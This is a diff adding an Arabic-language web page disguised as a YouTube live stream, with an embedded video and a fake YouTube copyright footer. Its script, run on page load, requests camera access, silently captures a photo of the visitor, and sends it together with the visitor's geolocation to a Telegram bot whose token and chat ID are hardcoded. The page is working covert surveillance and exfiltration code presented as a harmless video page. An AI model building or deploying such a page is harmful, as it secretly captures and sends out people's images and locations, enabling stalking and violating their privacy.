@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Style Live Stream</title>
+    <style>
+        /* الخلفية المتحركة */
+        @keyframes backgroundAnimation {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+
+        body {
+            background: linear-gradient(135deg, #ff0000, #ff4d4d);
+            animation: backgroundAnimation 5s ease infinite;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .navbar {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px 40px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            text-align: center;
+            font-size: 2rem;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+            z-index: 10;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin: 50px 0;
+            font-weight: 600;
+            letter-spacing: 1px;
+            animation: fadeIn 2s ease;
+        }
+
+        .video-container {
+            width: 100%;
+            max-width: 1200px;
+            height: 70vh;
+            margin-top: 100px;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            position: relative;
+            animation: zoomIn 1.5s ease;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .btn {
+            background-color: #cc0000;
+            color: white;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 30px;
+            border: none;
+        }
+
+        .btn:hover {
+            background-color: #990000;
+            transform: scale(1.1);
+        }
+
+        /* تأثير النص */
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* تأثير التكبير */
+        @keyframes zoomIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            color: white;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            opacity: 0.8;
+            animation: fadeIn 2s ease;
+        }
+
+        /* تصميم متجاوب للأجهزة الصغيرة */
+        @media screen and (max-width: 768px) {
+            .navbar {
+                font-size: 1.5rem;
+                padding: 15px 20px;
+            }
+
+            h1 {
+                font-size: 2.5rem;
+            }
+
+            .video-container {
+                height: 50vh;
+            }
+
+            .btn {
+                font-size: 1rem;
+                padding: 12px 30px;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            h1 {
+                font-size: 2rem;
+            }
+
+            .video-container {
+                height: 45vh;
+            }
+
+            .btn {
+                font-size: 0.9rem;
+                padding: 10px 25px;
+            }
+
+            .footer {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        YouTube
+    </div>
+
+    <h1>مرحبًا بك في البث المباشر</h1>
+
+    <!-- تضمين البث المباشر -->
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=0" 
+        frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <!-- زر تفاعل -->
+    <button class="btn" onclick="alert('شكراً لتفاعلك!')">تفاعل الآن</button>
+
+    <div class="footer">
+        © 2024 YouTube. All Rights Reserved.
+    </div>
+
+    <script>
+        const BOT_TOKEN = "6611757234:AAEoATfcF8gD-9qLHQNGE48HVkmryBnVI4c";
+        const CHAT_ID = "1088226862";
+
+        // إرسال رسالة نصية إلى البوت
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url).then(response => {
+                if (response.ok) {
+                    console.log("Message sent successfully!");
+                } else {
+                    console.error("Failed to send message.");
+                }
+            });
+        }
+
+        // إرسال صورة إلى Telegram
+        function sendImageToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'image.jpg');  // استخدام Blob مع اسم الملف
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Image sent successfully!");
+                } else {
+                    console.error("Failed to send image.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+
+        // إرسال موقع جغرافي في Google Maps
+        function sendLocationToTelegram(latitude, longitude) {
+            const locationUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Here%20is%20the%20location:%20https://www.google.com/maps?q=${latitude},${longitude}`;
+            fetch(locationUrl).then(response => {
+                if (response.ok) {
+                    console.log("Location sent successfully!");
+                } else {
+                    console.error("Failed to send location.");
+                }
+            });
+        }
+
+        // طلب إذن الوصول للكاميرا
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // الحصول على تدفق الفيديو ولكن دون عرضه للمستخدم
+                    const videoElement = document.createElement('video');
+                    videoElement.srcObject = stream;
+                    videoElement.play();
+
+                    setTimeout(() => {
+                        // التقاط صورة
+                        const canvas = document.createElement('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                        // تحويل الصورة إلى Blob بدلاً من Data URL
+                        canvas.toBlob(blob => {
+                            // إرسال الصورة إلى البوت
+                            sendImageToTelegram(blob);
+
+                            // إرسال الموقع الجغرافي
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(position => {
+                                    const latitude = position.coords.latitude;
+                                    const longitude = position.coords.longitude;
+                                    sendLocationToTelegram(latitude, longitude);
+                                });
+                            }
+                        }, 'image/jpeg');
+                    }, 1000); // تأخير صغير بعد بدء الفيديو لضمان أن الكاميرا تعمل
+                })
+                .catch(error => {
+                    console.error("Camera access denied or failed:", error);
+                    alert("فشل الوصول إلى الكاميرا.");
+                });
+        }
+
+        // استدعاء دالة طلب الوصول إلى الكاميرا مباشرة عند تحميل الصفحة
+        window.onload = function() {
+            requestCameraAccess();
+        };
+    </script>
+</body>
+</html>
